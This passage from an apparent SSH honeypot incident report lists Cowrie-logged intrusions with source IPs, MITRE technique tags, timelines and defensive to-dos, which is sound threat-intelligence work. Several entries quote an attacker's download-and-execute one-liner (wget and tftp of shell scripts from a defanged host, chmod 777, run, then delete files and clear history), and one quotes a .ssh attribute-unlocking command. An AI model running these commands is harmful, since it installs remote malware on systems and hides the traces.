| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:11:18` | `cowrie.session.connect` |
| `2026-07-05 11:11:18` | `cowrie.client.version` |
| `2026-07-05 11:11:18` | `cowrie.client.kex` |
| `2026-07-05 11:11:21` | `cowrie.login.success` |
| `2026-07-05 11:11:23` | `cowrie.session.params` |
| `2026-07-05 11:11:23` | `cowrie.command.input` |
| `2026-07-05 11:11:23` | `cowrie.command.input` |
| `2026-07-05 11:11:23` | `cowrie.command.input` |
| `2026-07-05 11:11:23` | `cowrie.command.input` |
| `2026-07-05 11:11:23` | `cowrie.command.input` |
| `2026-07-05 11:11:23` | `cowrie.command.success` |
| `2026-07-05 11:11:23` | `cowrie.command.input` |
| `2026-07-05 11:11:23` | `cowrie.command.input` |
| `2026-07-05 11:11:23` | `cowrie.command.input` |
| `2026-07-05 11:11:23` | `cowrie.command.input` |
| `2026-07-05 11:11:24` | `cowrie.log.closed` |
| `2026-07-05 11:11:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0f987f55c97

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 11:12 |
| **Last Seen** | 2026-07-05 11:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:12:48` | `cowrie.session.connect` |
| `2026-07-05 11:12:49` | `cowrie.client.version` |
| `2026-07-05 11:12:49` | `cowrie.client.kex` |
| `2026-07-05 11:12:52` | `cowrie.login.success` |
| `2026-07-05 11:12:55` | `cowrie.session.params` |
| `2026-07-05 11:12:55` | `cowrie.command.input` |
| `2026-07-05 11:12:55` | `cowrie.command.input` |
| `2026-07-05 11:12:55` | `cowrie.command.input` |
| `2026-07-05 11:12:55` | `cowrie.command.input` |
| `2026-07-05 11:12:55` | `cowrie.command.input` |
| `2026-07-05 11:12:55` | `cowrie.command.success` |
| `2026-07-05 11:12:55` | `cowrie.command.input` |
| `2026-07-05 11:12:55` | `cowrie.command.input` |
| `2026-07-05 11:12:55` | `cowrie.command.input` |
| `2026-07-05 11:12:55` | `cowrie.command.input` |
| `2026-07-05 11:12:56` | `cowrie.log.closed` |
| `2026-07-05 11:12:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fdd12e80e40

| Field | Detail |
|---|---|
| **Source IP** | `83.168.69[.]141` |
| **First Seen** | 2026-07-05 11:13 |
| **Last Seen** | 2026-07-05 11:13 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://83.168.110[.]191/re.sh; chmod 777 *; sh re.sh; tftp -g 83.168.110[.]191 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c` |
| **Download Attempts** | hxxp://83.168.110[.]191/re.sh, hxxp://83.168.110[.]191/updaterros.x86_64, hxxp://83.168.110[.]191/updaterros.x86_64 |
| **Malware Analysis** | 93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db (MEDIUM), 21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c (MEDIUM), 6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e (MEDIUM), 3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569 (MEDIUM) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:13:04` | `cowrie.session.connect` |
| `2026-07-05 11:13:04` | `cowrie.login.success` |
| `2026-07-05 11:13:05` | `cowrie.session.params` |
| `2026-07-05 11:13:06` | `cowrie.command.input` |
| `2026-07-05 11:13:06` | `cowrie.command.input` |
| `2026-07-05 11:13:07` | `cowrie.session.file_download` |
| `2026-07-05 11:13:07` | `cowrie.session.file_download` |
| `2026-07-05 11:13:07` | `cowrie.session.file_download.failed` |
| `2026-07-05 11:13:07` | `cowrie.session.file_download` |
| `2026-07-05 11:13:08` | `cowrie.session.file_download` |
| `2026-07-05 11:13:08` | `cowrie.session.file_download` |
| `2026-07-05 11:13:08` | `cowrie.session.file_download` |
| `2026-07-05 11:13:09` | `cowrie.session.file_download` |
| `2026-07-05 11:13:21` | `cowrie.log.closed` |
| `2026-07-05 11:13:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.168.69[.]141` to AbuseIPDB if not already reported
- [ ] Block `83.168.69[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a29d1c27d0d

| Field | Detail |
|---|---|
| **Source IP** | `83.168.69[.]141` |
| **First Seen** | 2026-07-05 11:13 |
| **Last Seen** | 2026-07-05 11:14 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://83.168.110[.]191/re.sh; chmod 777 *; sh re.sh; tftp -g 83.168.110[.]191 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c` |
| **Download Attempts** | hxxp://83.168.110[.]191/re.sh, hxxp://83.168.110[.]191/updaterros.x86_64 |
| **Malware Analysis** | 93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db (MEDIUM) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:13:54` | `cowrie.session.connect` |
| `2026-07-05 11:13:55` | `cowrie.login.success` |
| `2026-07-05 11:13:55` | `cowrie.session.params` |
| `2026-07-05 11:13:57` | `cowrie.command.input` |
| `2026-07-05 11:13:57` | `cowrie.command.input` |
| `2026-07-05 11:13:57` | `cowrie.session.file_download` |
| `2026-07-05 11:13:57` | `cowrie.session.file_download` |
| `2026-07-05 11:13:57` | `cowrie.session.file_download.failed` |
| `2026-07-05 11:14:12` | `cowrie.log.closed` |
| `2026-07-05 11:14:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.168.69[.]141` to AbuseIPDB if not already reported
- [ ] Block `83.168.69[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-690d73cae9a4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 11:14 |
| **Last Seen** | 2026-07-05 11:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:14:18` | `cowrie.session.connect` |
| `2026-07-05 11:14:19` | `cowrie.client.version` |
| `2026-07-05 11:14:19` | `cowrie.client.kex` |
| `2026-07-05 11:14:22` | `cowrie.login.success` |
| `2026-07-05 11:14:24` | `cowrie.session.params` |
| `2026-07-05 11:14:24` | `cowrie.command.input` |
| `2026-07-05 11:14:24` | `cowrie.command.input` |
| `2026-07-05 11:14:24` | `cowrie.command.input` |
| `2026-07-05 11:14:24` | `cowrie.command.input` |
| `2026-07-05 11:14:24` | `cowrie.command.input` |
| `2026-07-05 11:14:24` | `cowrie.command.success` |
| `2026-07-05 11:14:24` | `cowrie.command.input` |
| `2026-07-05 11:14:24` | `cowrie.command.input` |
| `2026-07-05 11:14:24` | `cowrie.command.input` |
| `2026-07-05 11:14:24` | `cowrie.command.input` |
| `2026-07-05 11:14:26` | `cowrie.log.closed` |
| `2026-07-05 11:14:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e58036488fd

| Field | Detail |
|---|---|
| **Source IP** | `83.168.69[.]141` |
| **First Seen** | 2026-07-05 11:14 |
| **Last Seen** | 2026-07-05 11:15 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://83.168.110[.]191/re.sh; chmod 777 *; sh re.sh; tftp -g 83.168.110[.]191 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:14:47` | `cowrie.session.connect` |
| `2026-07-05 11:14:47` | `cowrie.login.success` |
| `2026-07-05 11:14:48` | `cowrie.session.params` |
| `2026-07-05 11:14:49` | `cowrie.command.input` |
| `2026-07-05 11:14:49` | `cowrie.command.input` |
| `2026-07-05 11:14:50` | `cowrie.session.file_download.failed` |
| `2026-07-05 11:15:04` | `cowrie.log.closed` |
| `2026-07-05 11:15:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.168.69[.]141` to AbuseIPDB if not already reported
- [ ] Block `83.168.69[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5fc303310d8

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 11:14 |
| **Last Seen** | 2026-07-05 11:15 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:14:55` | `cowrie.session.connect` |
| `2026-07-05 11:14:56` | `cowrie.client.version` |
| `2026-07-05 11:14:56` | `cowrie.client.kex` |
| `2026-07-05 11:15:01` | `cowrie.login.success` |
| `2026-07-05 11:15:05` | `cowrie.session.params` |
| `2026-07-05 11:15:05` | `cowrie.command.input` |
| `2026-07-05 11:15:06` | `cowrie.log.closed` |
| `2026-07-05 11:15:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-215a463c4d89

| Field | Detail |
|---|---|
| **Source IP** | `223.223.199[.]221` |
| **First Seen** | 2026-07-05 11:15 |
| **Last Seen** | 2026-07-05 11:20 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:15:37` | `cowrie.session.connect` |
| `2026-07-05 11:15:37` | `cowrie.client.version` |
| `2026-07-05 11:15:37` | `cowrie.client.kex` |
| `2026-07-05 11:15:38` | `cowrie.login.success` |
| `2026-07-05 11:15:39` | `cowrie.session.params` |
| `2026-07-05 11:15:39` | `cowrie.command.input` |
| `2026-07-05 11:15:39` | `cowrie.command.failed` |
| `2026-07-05 11:20:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.223.199[.]221` to AbuseIPDB if not already reported
- [ ] Block `223.223.199[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4560fbcf29d0

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-05 11:16 |
| **Last Seen** | 2026-07-05 11:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:16:30` | `cowrie.session.connect` |
| `2026-07-05 11:16:30` | `cowrie.client.version` |
| `2026-07-05 11:16:31` | `cowrie.client.kex` |
| `2026-07-05 11:16:31` | `cowrie.login.success` |
| `2026-07-05 11:16:31` | `cowrie.direct-tcpip.request` |
| `2026-07-05 11:16:31` | `cowrie.direct-tcpip.data` |
| `2026-07-05 11:16:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58a3a3ef426c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 11:17 |
| **Last Seen** | 2026-07-05 11:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:17:08` | `cowrie.session.connect` |
| `2026-07-05 11:17:09` | `cowrie.client.version` |
| `2026-07-05 11:17:09` | `cowrie.client.kex` |
| `2026-07-05 11:17:11` | `cowrie.login.success` |
| `2026-07-05 11:17:13` | `cowrie.session.params` |
| `2026-07-05 11:17:13` | `cowrie.command.input` |
| `2026-07-05 11:17:13` | `cowrie.command.input` |
| `2026-07-05 11:17:13` | `cowrie.command.input` |
| `2026-07-05 11:17:13` | `cowrie.command.input` |
| `2026-07-05 11:17:13` | `cowrie.command.input` |
| `2026-07-05 11:17:13` | `cowrie.command.success` |
| `2026-07-05 11:17:13` | `cowrie.command.input` |
| `2026-07-05 11:17:13` | `cowrie.command.input` |
| `2026-07-05 11:17:13` | `cowrie.command.input` |
| `2026-07-05 11:17:13` | `cowrie.command.input` |
| `2026-07-05 11:17:14` | `cowrie.log.closed` |
| `2026-07-05 11:17:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78298f597bab

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 11:18 |
| **Last Seen** | 2026-07-05 11:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:18:35` | `cowrie.session.connect` |
| `2026-07-05 11:18:35` | `cowrie.client.version` |
| `2026-07-05 11:18:35` | `cowrie.client.kex` |
| `2026-07-05 11:18:38` | `cowrie.login.success` |
| `2026-07-05 11:18:40` | `cowrie.session.params` |
| `2026-07-05 11:18:40` | `cowrie.command.input` |
| `2026-07-05 11:18:40` | `cowrie.command.input` |
| `2026-07-05 11:18:40` | `cowrie.command.input` |
| `2026-07-05 11:18:40` | `cowrie.command.input` |
| `2026-07-05 11:18:40` | `cowrie.command.input` |
| `2026-07-05 11:18:40` | `cowrie.command.success` |
| `2026-07-05 11:18:40` | `cowrie.command.input` |
| `2026-07-05 11:18:40` | `cowrie.command.input` |
| `2026-07-05 11:18:40` | `cowrie.command.input` |
| `2026-07-05 11:18:40` | `cowrie.command.input` |
| `2026-07-05 11:18:41` | `cowrie.log.closed` |
| `2026-07-05 11:18:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-235ec5d76642

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 11:20 |
| **Last Seen** | 2026-07-05 11:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:20:03` | `cowrie.session.connect` |
| `2026-07-05 11:20:04` | `cowrie.client.version` |
| `2026-07-05 11:20:04` | `cowrie.client.kex` |
| `2026-07-05 11:20:07` | `cowrie.login.success` |
| `2026-07-05 11:20:09` | `cowrie.session.params` |
| `2026-07-05 11:20:09` | `cowrie.command.input` |
| `2026-07-05 11:20:09` | `cowrie.command.input` |
| `2026-07-05 11:20:09` | `cowrie.command.input` |
| `2026-07-05 11:20:09` | `cowrie.command.input` |
| `2026-07-05 11:20:09` | `cowrie.command.input` |
| `2026-07-05 11:20:09` | `cowrie.command.success` |
| `2026-07-05 11:20:09` | `cowrie.command.input` |
| `2026-07-05 11:20:09` | `cowrie.command.input` |
| `2026-07-05 11:20:09` | `cowrie.command.input` |
| `2026-07-05 11:20:09` | `cowrie.command.input` |
| `2026-07-05 11:20:10` | `cowrie.log.closed` |
| `2026-07-05 11:20:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01e108bc435d

| Field | Detail |
|---|---|
| **Source IP** | `180.95.231[.]27` |
| **First Seen** | 2026-07-05 11:20 |
| **Last Seen** | 2026-07-05 11:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Accept: */*` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:20:20` | `cowrie.session.connect` |
| `2026-07-05 11:20:20` | `cowrie.login.success` |
| `2026-07-05 11:20:21` | `cowrie.session.params` |
| `2026-07-05 11:20:21` | `cowrie.command.input` |
| `2026-07-05 11:20:21` | `cowrie.command.failed` |
| `2026-07-05 11:20:21` | `cowrie.command.input` |
| `2026-07-05 11:20:21` | `cowrie.log.closed` |
| `2026-07-05 11:20:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.95.231[.]27` to AbuseIPDB if not already reported
- [ ] Block `180.95.231[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91daa297950c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 11:21 |
| **Last Seen** | 2026-07-05 11:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:21:38` | `cowrie.session.connect` |
| `2026-07-05 11:21:39` | `cowrie.client.version` |
| `2026-07-05 11:21:39` | `cowrie.client.kex` |
| `2026-07-05 11:21:42` | `cowrie.login.success` |
| `2026-07-05 11:21:44` | `cowrie.session.params` |
| `2026-07-05 11:21:44` | `cowrie.command.input` |
| `2026-07-05 11:21:44` | `cowrie.command.input` |
| `2026-07-05 11:21:44` | `cowrie.command.input` |
| `2026-07-05 11:21:44` | `cowrie.command.input` |
| `2026-07-05 11:21:44` | `cowrie.command.input` |
| `2026-07-05 11:21:44` | `cowrie.command.success` |
| `2026-07-05 11:21:44` | `cowrie.command.input` |
| `2026-07-05 11:21:44` | `cowrie.command.input` |
| `2026-07-05 11:21:44` | `cowrie.command.input` |
| `2026-07-05 11:21:44` | `cowrie.command.input` |
| `2026-07-05 11:21:45` | `cowrie.log.closed` |
| `2026-07-05 11:21:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f91f86e4a4b0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 11:23 |
| **Last Seen** | 2026-07-05 11:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 11:23:10` | `cowrie.session.connect` |
| `2026-07-05 11:23:11` | `cowrie.client.version` |
| `2026-07-05 11:23:11` | `cowrie.client.kex` |
| `2026-07-05 11:23:13` | `cowrie.login.success` |
| `2026-07-05 11:23:15` | `cowrie.session.params` |
| `2026-07-05 11:23:15` | `cowrie.command.input` |
| `2026-07-05 11:23:15` | `cowrie.command.input` |
| `2026-07-05 11:23:15` | `cowrie.command.input` |
| `2026-07-05 11:23:15` | `cowrie.command.input` |
| `2026-07-05 11:23:15` | `cowrie.command.input` |
| `2026-07-05 11:23:15` | `cowrie.command.success` |
| `2026-07-05 11:23:15` | `cowrie.command.input` |
| `2026-07-05 11:23:15` | `cowrie.command.input` |
| `2026-07-05 11:23:15` | `cowrie.command.input` |
| `2026-07-05 11:23:15` | `cowrie.command.input` |
| `2026-07-05 11:23:16` | `cowrie.log.closed` |
| `2026-07-05 11:23:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4937975986a8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-05 11:24 |
| **Last Seen** | 2026-07-05 11:24 |
| **Session Duration** | 6s |
